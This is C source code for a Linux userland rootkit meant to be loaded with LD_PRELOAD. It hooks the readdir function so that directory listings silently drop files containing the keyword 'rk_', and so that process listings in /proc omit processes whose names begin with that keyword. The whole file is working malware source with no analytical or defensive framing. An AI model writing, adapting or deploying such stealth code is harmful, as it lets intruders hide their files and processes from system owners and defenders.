#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>

static const char *HIDE_KEY = "rk_";  // Keyword to hide files and process names

int is_hidden_process(const char *pid_str) {
    char path[256];
    char proc_name[256];
    FILE *f;

    // Only check numeric directory names (PIDs)
    for (int i = 0; pid_str[i] != '\0'; i++) {
        if (pid_str[i] < '0' || pid_str[i] > '9') return 0;
    }

    snprintf(path, sizeof(path), "/proc/%s/comm", pid_str);
    f = fopen(path, "r");
    if (!f) return 0;

    if (fgets(proc_name, sizeof(proc_name), f) == NULL) {
        fclose(f);
        return 0;
    }
    fclose(f);

    // Remove trailing newline
    proc_name[strcspn(proc_name, "\n")] = 0;

    if (strncmp(proc_name, HIDE_KEY, strlen(HIDE_KEY)) == 0) {
        return 1;
    }
    return 0;
}

struct dirent *(*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir)
        original_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        // Hide files or directories that start with rk_
        if (strstr(entry->d_name, HIDE_KEY) != NULL) {
            continue;
        }

        // Hide processes in /proc
        int fd = dirfd(dirp);
        char fd_path[PATH_MAX], target_path[PATH_MAX];
        ssize_t len;

        if (fd != -1) {
            snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
            len = readlink(fd_path, target_path, sizeof(target_path) - 1);
            if (len != -1) {
                target_path[len] = '\0';
                if (strcmp(target_path, "/proc") == 0) {
                    if (is_hidden_process(entry->d_name)) {
                        continue;
                    }
                }
            }
        }

        return entry;
    }

    return NULL;
}
